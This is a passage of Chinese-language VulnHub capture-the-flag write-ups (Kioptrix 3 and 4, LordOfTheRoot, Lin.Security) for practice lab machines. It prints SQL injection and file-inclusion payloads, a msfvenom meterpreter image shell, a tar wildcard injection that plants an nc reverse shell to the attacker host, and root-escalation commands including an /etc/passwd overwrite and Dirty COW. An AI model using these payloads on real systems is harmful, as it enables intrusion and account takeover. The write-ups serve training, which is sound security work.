<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW GRANTS FOR root@ &#39;localhost&#39;;	&#x2F;&#x2F;查看权限</span><br><span class="line">SHOW VARIABLES LIKE &quot;%secure%&quot;;		&#x2F;&#x2F;查看是否可以写入文件，这里为空</span><br></pre></td></tr></table></figure>

<p>但这里无法写入文件，具体原因未知。。。</p>
<p><img src="/images/Kioptrix-Level-3/13.jpg" alt="13">尝试信息收集，获取到两个用户和加密后的hash</p>
<p><img src="/images/Kioptrix-Level-3/11.jpg" alt="11"></p>
<p>破解两个hash可以得到两组账号名和密码</p>
<table>
<thead>
<tr>
<th>账户</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>dreg</td>
<td>Mast3r</td>
</tr>
<tr>
<td>loneferret</td>
<td>starwars</td>
</tr>
</tbody></table>
<p>另外在<code>gallarific_users</code>表中也存在一个账号密码</p>
<table>
<thead>
<tr>
<th>账户</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>n0t7t1k4</td>
</tr>
</tbody></table>
<h3 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h3><p>漏洞地址为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1&amp;sort&#x3D;photoid#photos</span><br></pre></td></tr></table></figure>

<p>存在回显注入、盲注、报错注入</p>
<p><img src="/images/Kioptrix-Level-3/14.jpg" alt="14"></p>
<p>我们同样可以利用这个漏洞来读出上面爆出的两个账号密码</p>
<p>可以使用sqlmap</p>
<p><img src="/images/Kioptrix-Level-3/15.jpg" alt="15"></p>
<h4 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h4><p>确认字段数(6)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1%20order%20by%206--+&amp;sort&#x3D;photoid#photos</span><br></pre></td></tr></table></figure>

<p>查看页面回显输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1%20union%20select%201,2,3,4,5,6--+&amp;sort&#x3D;photoid#photos</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/16.jpg" alt="16"></p>
<p>确认数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1 union select 1,version(),database(),4,5,6--+&amp;sort&#x3D;photoid#photos</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/17.jpg" alt="17"></p>
<p>确认表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1 union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema&#x3D;&#39;gallery&#39;--+&amp;sort&#x3D;photoid#photos</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/18.jpg" alt="18"></p>
<p>最后读取密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1%20union%20select%201,username,password,4,5,6%20FROM%20dev_accounts#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/19.jpg" alt="19"></p>
<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>URL地址如下，<code>index</code>参数疑似文件包含漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;index.php?page&#x3D;index</span><br></pre></td></tr></table></figure>

<p>尝试文件读取(失败)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>尝试00截断(失败)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br></pre></td></tr></table></figure>

<p>尝试00截断，并添加文件格式关键字(成功)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;index.php?system&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00jpg</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/20.jpg" alt="20"></p>
<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>主页有一个用户登录页面，通过之前爆出来的账号密码，可以登录到后台<br>用户名:admin<br>密码:n0t7t1k4</p>
<p>后台网址<br>该页面下有提示，链接被注释掉了</p>
<p><img src="/images/Kioptrix-Level-3/21.jpg" alt="21"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gadmin&#x2F;</span><br></pre></td></tr></table></figure>

<p>制作图片木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.3 LPORT&#x3D;8888 -f raw -o evilshell.jpg</span><br></pre></td></tr></table></figure>

<p>后台存在图片上传点，成功上传图片(图片名称:thumb_8vnes2fe1a.jpg)</p>
<p><img src="/images/Kioptrix-Level-3/22.jpg" alt="22"></p>
<p>之后metasploit开启监听，并访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.251&#x2F;index.php?system&#x3D;..&#x2F;..&#x2F;gallery&#x2F;photos&#x2F;thumb_8vnes2fe1a.jpg%00jpg</span><br></pre></td></tr></table></figure>

<p>由于我们未获得绝对路径，只能通过相对路径多次尝试，最后找到图片马的位置(跨越两层目录)</p>
<p>之后，成功得到meterpreter会话</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><table>
<thead>
<tr>
<th>账户</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>dreg</td>
<td>Mast3r</td>
</tr>
<tr>
<td>loneferret</td>
<td>starwars</td>
</tr>
</tbody></table>
<p>发现上述账号可进行ssh连接<br>在账号<code>loneferret</code>中，发现了一些有趣的信息，它让我执行<code>sudo ht</code></p>
<p><img src="/images/Kioptrix-Level-3/23.jpg" alt="23"></p>
<p>但是这里XTERM貌似不支持256色，需要手动修改一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br><span class="line">Error opening terminal: xterm-256color.</span><br><span class="line">loneferret@Kioptrix3:~$ echo $TERM</span><br><span class="line">xterm-256color</span><br><span class="line">loneferret@Kioptrix3:~$ export TERM&#x3D;xterm      </span><br><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br></pre></td></tr></table></figure>

<p>执行成功后，以<code>root</code>打开了一个文本编辑器</p>
<p><img src="/images/Kioptrix-Level-3/24.jpg" alt="24"></p>
<p>修改<code>/etc/passwd</code>的用户标识号：组标识号</p>
<p><img src="/images/Kioptrix-Level-3/25.jpg" alt="25"></p>
<p>之后重新ssh，成功获取root</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Kioptrix3:~# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),100(users)</span><br></pre></td></tr></table></figure>

<p>或者修改<code>/etc/sudoers</code>使当前用户可以无密码使用所有root权限</p>
<p><img src="/images/Kioptrix-Level-3/26.jpg" alt="26"></p>
<p>结果</p>
<p><img src="/images/Kioptrix-Level-3/27.jpg" alt="27"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>之前获取了meterpreter会话，进入模拟shell<br>查看内核版本2.6.24，可以使用脏牛提权</p>
<p>​    <img src="/images/Kioptrix-Level-3/28.jpg" alt="28"></p>
<p>可以使用脏牛提权</p>
<p><img src="/images/Kioptrix-Level-3/29.jpg" alt="29"></p>
<p>40847.cpp编译执行有点问题</p>
<p><img src="/images/Kioptrix-Level-3/30.jpg" alt="30"></p>
<p>40839.c没有问题</p>
<p><img src="/images/Kioptrix-Level-3/31.jpg" alt="31"></p>
<p>成功创建了root账户<br>用户名:firefart<br>密码:toor</p>
<p><img src="/images/Kioptrix-Level-3/32.jpg" alt="32"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Kioptrix-Level-4</title>
    <url>/2020/05/20/%E9%9D%B6%E5%9C%BAKioptrix-Level-4/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-4"><a href="#Kioptrix-Level-4" class="headerlink" title="Kioptrix_Level_4"></a>Kioptrix_Level_4</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.233</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Kioptrix-Level-4/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><h4 id="SMB枚举"><a href="#SMB枚举" class="headerlink" title="SMB枚举"></a>SMB枚举</h4><p>枚举这里遇到一些问题(kali 5.3.0)</p>
<p>enum4linux枚举不了，可能工具太老了，不知道什么问题，换个老版本的kali是可以的</p>
<p>nmap的nse脚本<code>smb_enum_users</code>报错，查看debug信息，找到了一篇同样错误的issues<br>需要修改<code>/usr/share/nmap/nselib/</code>下的<code>msrpc.lua</code>和<code>msrpctypes.lua</code></p>
<blockquote>
<p><a href="https://github.com/nmap/nmap/issues/1707">https://github.com/nmap/nmap/issues/1707</a></p>
</blockquote>
<p><img src="/images/Kioptrix-Level-4/3.jpg" alt="3"></p>
<p>smb枚举似乎没发现太有价值的信息</p>
<h4 id="HTTP枚举"><a href="#HTTP枚举" class="headerlink" title="HTTP枚举"></a>HTTP枚举</h4><p>首先访问80端口，是一个登录界面</p>
<p><img src="/images/Kioptrix-Level-4/4.jpg" alt="4"></p>
<p>nikto</p>
<p><img src="/images/Kioptrix-Level-4/5.jpg" alt="5"></p>
<p>dirb</p>
<p>这里发现了有意思的地方<br><code>http://192.168.1.233/john/</code>是一个目录</p>
<p><img src="/images/Kioptrix-Level-4/6.jpg" alt="6"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>在80端口的登录页面，尝试一些常见的闭合符号:<code>) &#39; &quot;</code><br>用户名尝试失败，但密码缺爆出了路径，存在sql注入</p>
<p><img src="/images/Kioptrix-Level-4/7.jpg" alt="7"></p>
<p>之后我使用万能密码进行登录尝试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>页面发生了一次302后，跳转到这个页面，确认一个盲注</p>
<p><img src="/images/Kioptrix-Level-4/8.jpg" alt="8"></p>
<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><p>测试发现，可以使用延迟注入，payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(if(length(database())&gt;4,5,0))-- </span><br></pre></td></tr></table></figure>

<p>也可以使用布尔注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or length(database())&gt;4 #</span><br></pre></td></tr></table></figure>

<p>但手工注入效率太低，就不展示了</p>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.1.233&#x2F;checklogin.php&quot; --data&#x3D;&quot;myusername&#x3D;admin&amp;mypassword&#x3D;123&amp;Submit&#x3D;Login&quot; -p mypassword</span><br></pre></td></tr></table></figure>

<p>是否跟随302跳转选NO，也可以得出同样的结论</p>
<p><img src="/images/Kioptrix-Level-4/9.jpg" alt="9"></p>
<p>之后进行<code>-dbs</code>→<code>--tables -D &quot;members&quot;</code>→<code>--dump -T &quot;members&quot; -D &quot;members&quot;</code></p>
<p><img src="/images/Kioptrix-Level-4/10.jpg" alt="10"></p>
<p>成功找出了用户名和密码</p>
<h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><p>利用爆出的用户名和密码尝试ssh连接</p>
<table>
<thead>
<tr>
<th>用户名</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>john</td>
<td>MyNameIsJohn</td>
</tr>
</tbody></table>
<p><img src="/images/Kioptrix-Level-4/11.jpg" alt="11"></p>
<p>连接是成功建立了，不过是一个受限的shell，输入help查看可以使用的命令<br>echo是shell逃逸常用的命令，ubuntu上默认安装了python，我们可以利用echo调用python实现逃逸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo os.system(&#39;&#x2F;bin&#x2F;bash&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-4/12.jpg" alt="12"></p>
<p>但权限和组都是用户，需要提权</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>进入<code>www</code>目录下，查看<code>checklogin.php</code>，成功获取了mysql密码(空)</p>
<p><img src="/images/Kioptrix-Level-4/13.jpg" alt="13"></p>
<p>之后尝试使用UDF提权<br>这里有些奇怪，靶场已经帮你创建好了可执行系统命令的UDF函数，你直接调用就好。。。</p>
<p><img src="/images/Kioptrix-Level-4/14.jpg" alt="14"></p>
<p>提权成功</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场LordOfTheRoot_1.0.1</title>
    <url>/2020/09/17/%E9%9D%B6%E5%9C%BALordOfTheRoot-1-0-1/</url>
    <content><![CDATA[<h1 id="LordOfTheRoot-1-0-1"><a href="#LordOfTheRoot-1-0-1" class="headerlink" title="LordOfTheRoot_1.0.1"></a>LordOfTheRoot_1.0.1</h1><p>kali:192.168.1.201<br>目标:192.168.1.205</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.205 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.205 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/LordOfTheRoot_1.0.1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ssh连接</p>
<p><img src="/images/LordOfTheRoot_1.0.1/2.png" alt="2"></p>
<p>提示了knockd</p>
<p>尝试敲门</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for x in 1 2 3; do nmap -Pn -p $x 192.168.1.205; done</span><br></pre></td></tr></table></figure>

<p>这种方法这里竟然不行，不知道为什么</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -Pn -p 1,2,3 192.168.1.205</span><br></pre></td></tr></table></figure>

<p>不搞骚操作是可以的</p>
<p>重新扫描发现1337端口，web服务</p>
<p><img src="/images/LordOfTheRoot_1.0.1/3.png" alt="3"></p>
<p>目录扫描发现了<code>/mordor/</code></p>
<p><img src="/images/LordOfTheRoot_1.0.1/4.png" alt="4"></p>
<p>接着有一段base64</p>
<p><img src="/images/LordOfTheRoot_1.0.1/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/LordOfTheRoot_1.0.1/6.png" alt="6"></p>
<p>尝试sql注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>成功登录，不过啥也没有，看来这里是要用盲注来获取一些数据了<br>尝试延时注入，成功payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(5)#</span><br></pre></td></tr></table></figure>

<p>盲注特别痛苦，就不手工了，给一个实例的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(if(length(database())&gt;2,5,0))#</span><br></pre></td></tr></table></figure>

<p>别忘了提交password参数就行</p>
<p>最后可以爆破出一个表</p>
<p><img src="/images/LordOfTheRoot_1.0.1/7.png" alt="7"></p>
<p>用它们尝试ssh登录</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/LordOfTheRoot_1.0.1/8.png" alt="8"></p>
<p>内核提权</p>
<p>尝试寻找</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit linux kernel 3.19</span><br></pre></td></tr></table></figure>

<p>没有可以用的，反而还把机器给打崩了</p>
<p>换个角度</p>
<p><img src="/images/LordOfTheRoot_1.0.1/9.png" alt="9"></p>
<p>发现</p>
<p><img src="/images/LordOfTheRoot_1.0.1/10.png" alt="10"></p>
<p>39166.c</p>
<p><img src="/images/LordOfTheRoot_1.0.1/11.png" alt="11"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Lin.Security</title>
    <url>/2020/09/15/%E9%9D%B6%E5%9C%BALin-Security/</url>
    <content><![CDATA[<h1 id="Lin-Security"><a href="#Lin-Security" class="headerlink" title="Lin.Security"></a>Lin.Security</h1><p>kali:192.168.1.201<br>目标:192.168.1.222</p>
<p>这是一台专门练习提权的靶机，有许多种常见方法<br>但这台机器的dhcp有点问题，需要修改一个地方</p>
<p>将<code>/etc/netplan/50-cloud-init.yaml</code>的enp0s3改为ens33即可</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.222 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.222 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/1.png" alt="1"></p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>2049端口枚举</p>
<p>挂载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -t nfs 192.168.1.222:&#x2F;home&#x2F;peter &#x2F;tmp&#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/2.png" alt="2"></p>
<p>是用户的home目录，可读但不可写</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们已经获取了凭据<code>bob/secret</code></p>
<p>接下来枚举主要通过linpeas，除非必要情况的手动确认</p>
<h3 id="方法1-sudo"><a href="#方法1-sudo" class="headerlink" title="方法1 sudo"></a>方法1 sudo</h3><p>检查sudo权限，这里要输入密码，所以linpeas不能扫出来</p>
<p><img src="/images/Lin.Security/3.png" alt="3"></p>
<p>这里面有很多的命令，很多可以提权，直接查GTFObins就行了</p>
<p>我试过了所有命令，都可以提权</p>
<h3 id="方法2-etc-passwd配置问题"><a href="#方法2-etc-passwd配置问题" class="headerlink" title="方法2 /etc/passwd配置问题"></a>方法2 /etc/passwd配置问题</h3><p>linpeas发现了在/etc/passwd中有一个配置问题(passwd的配置优先级高于shadow)</p>
<p>insecurity被配置为了root权限，且直接把密码写在passwd里了</p>
<p><img src="/images/Lin.Security/4.png" alt="4"></p>
<p>可以是john进行破解</p>
<p><img src="/images/Lin.Security/5.png" alt="5"></p>
<p>su切换过去就是root权限了</p>
<h3 id="方法3-隐藏文件"><a href="#方法3-隐藏文件" class="headerlink" title="方法3 隐藏文件"></a>方法3 隐藏文件</h3><p><img src="/images/Lin.Security/6.png" alt="6"></p>
<p>手动枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -name &quot;.*&quot; -type f -path &quot;&#x2F;home&#x2F;*&quot; -exec ls -la &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p>发现了.secret，我们拥有读权限，发现密码MySuperS3cretValue!</p>
<p><code>susan/MySuperS3cretValue!</code></p>
<p>我们现在就获得了另一个用户susan，可以在它用户下运行linpeas</p>
<h3 id="方法4-SUID"><a href="#方法4-SUID" class="headerlink" title="方法4 SUID"></a>方法4 SUID</h3><h4 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h4><p>发现了SUID xxd</p>
<p><img src="/images/Lin.Security/7.png" alt="7"></p>
<p>不过当前用户bob无法运行，发现了组可以执行，查看组内用户包含susan，切换到susan执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxd &quot;&#x2F;etc&#x2F;shadow&quot; | xxd -r</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/8.png" alt="8"></p>
<p>可以读取敏感文件，比如root密码的哈希</p>
<p><img src="/images/Lin.Security/9.png" alt="9"></p>
<p>直接破解，这样就可以切换到root了</p>
<p>xxd还提供了写入功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; | xxd | xxd -r - &quot;&#x2F;etc&#x2F;passwd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/10.png" alt="10"></p>
<h4 id="taskset"><a href="#taskset" class="headerlink" title="taskset"></a>taskset</h4><p><img src="/images/Lin.Security/11.png" alt="11"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">taskset 1 &#x2F;bin&#x2F;sh -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/12.png" alt="12"></p>
<h3 id="方法5-计划任务-crontab"><a href="#方法5-计划任务-crontab" class="headerlink" title="方法5 计划任务 crontab"></a>方法5 计划任务 crontab</h3><p>linpeas发现</p>
<p><img src="/images/Lin.Security/13.png" alt="13"></p>
<p>手动确认</p>
<p><img src="/images/Lin.Security/14.png" alt="14"></p>
<p>查看内容</p>
<p><img src="/images/Lin.Security/15.png" alt="15"></p>
<p>看来是一个bash脚本，以root权限备份/home下的文件，压缩到/etc/backups</p>
<p>可以使用<strong>tar通配符注入</strong>进行提权，原理是通过通配符注入命令，拼接成tar执行任意命令的形式，原语句如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zcf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null --checkpoint&#x3D;1 --checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>提权方式参考<a href="https://xz.aliyun.com/t/2401%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E6%8D%A2%E4%BB%A5%E4%B8%8Bpayload">https://xz.aliyun.com/t/2401，这里我们换以下payload</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~				&#x2F;&#x2F;根据脚本备份位置，回到用户的主目录下</span><br><span class="line">echo &quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.1.201 53 &gt;&#x2F;tmp&#x2F;f&quot; &gt; shell.sh &amp;&amp;chmod +x shell.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action&#x3D;exec&#x3D;sh shell.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/16.png" alt="16"></p>
<p>等待一下</p>
<p><img src="/images/Lin.Security/17.png" alt="17"></p>
<p>获得反弹shell</p>
<h3 id="方法6-NFS"><a href="#方法6-NFS" class="headerlink" title="方法6 NFS"></a>方法6 NFS</h3><p>之前枚举了NFS可以挂载peter的家目录，但我们进不去，现在我们读取/etc/passwd获取UID和GID，在kali伪造用户</p>
<p><img src="/images/Lin.Security/18.png" alt="18"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">groupadd -g 1005 evil</span><br><span class="line">adduser evil -uid 1001 -gid 1005</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/19.png" alt="19"></p>
<p>之后重新挂载，这下我们就拥有了完整的权限</p>
<p><img src="/images/Lin.Security/20.png" alt="20"></p>
<p>之后生成密钥对，传输公钥给对方</p>
<p>kali</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>

<p>对方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line">echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC08nu+8DHbVi8+xWGeOU6kq2kgdBHhR1+qjLS&#x2F;vfSQReNXXWiMucl&#x2F;eCkKmyfEsQLDnwxFcInHKHf65MGJYp7stfwmiMM2lH1uWaEk6SNyUrRdCI0RXMC6Ib+VoUWoVKbWkjNhNbLBtSoRocIyuDgbf0IUoVrCdlNox9Dv7Rn8eDvIZAdquc0LZEfgYcfku&#x2F;bQrJ9qr0ZAsz3PTp&#x2F;hU9bcO4BMceOYCj+kGDhjVqvZ7q0J&#x2F;4F0xDgp8H4Be64KyYosEagTzlrlYVvDJ3J5qzKH2lAn0wHR5IooMnyeKZebahkPfqKfrTLPW972fn3JQSPGMdXXUx1ks7YR9r8xyyrO8uJhTWXqBMn7F1OYp0SoN93yBSRMvyTMvyZLPXnkeo02qpb0Z0HQPi69fBADU1MEsVoBrsRa4XtXFOsVRSosqXBkuT79iLvbQN+IDecJSVXhujRqhDIluSpaQKGz+4UYOiGAn8hcMsFTjfsYBQ1amnYkJtBTJkU+TGmU0uhai1M&#x3D; root@kali&#39; &gt; .&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/21.png" alt="21"></p>
<p>登陆成功</p>
<h3 id="方法7-docker"><a href="#方法7-docker" class="headerlink" title="方法7 docker"></a>方法7 docker</h3><p><img src="/images/Lin.Security/22.png" alt="22"></p>
<p>docker组提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it alpine chroot &#x2F;mnt sh</span><br></pre></td></tr></table></figure>

<h3 id="方法8-sudo"><a href="#方法8-sudo" class="headerlink" title="方法8 sudo"></a>方法8 sudo</h3><p>我们不知道peter的密码，但peter的sudoers配置是NOPASSWD</p>
<p><img src="/images/Lin.Security/23.png" alt="23"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<h3 id="方法9？-systemd"><a href="#方法9？-systemd" class="headerlink" title="方法9？ systemd"></a>方法9？ systemd</h3><p>这里有点作弊，不是正规手段</p>
<p>检查服务内容</p>
<p><img src="/images/Lin.Security/24.png" alt="24"></p>
<p>返现这个debug.service可写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;debug.service</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lin.Security/25.png" alt="25"></p>
<p>发现是以root身份运行，我们可以修改ExecStart为我们的恶意脚本</p>
<p><img src="/images/Lin.Security/26.png" alt="26"></p>
<p>修改</p>
<p><img src="/images/Lin.Security/27.png" alt="27"></p>
<p>但是这里有点小作弊，ExecStart需要服务启动时才能加载，我们当前账户不能重启服务后者重启机器<br>反正我就直接重启了虚拟机</p>
<p><img src="/images/Lin.Security/28.png" alt="28"></p>
<p><img src="/images/Lin.Security/29.png" alt="29"></p>
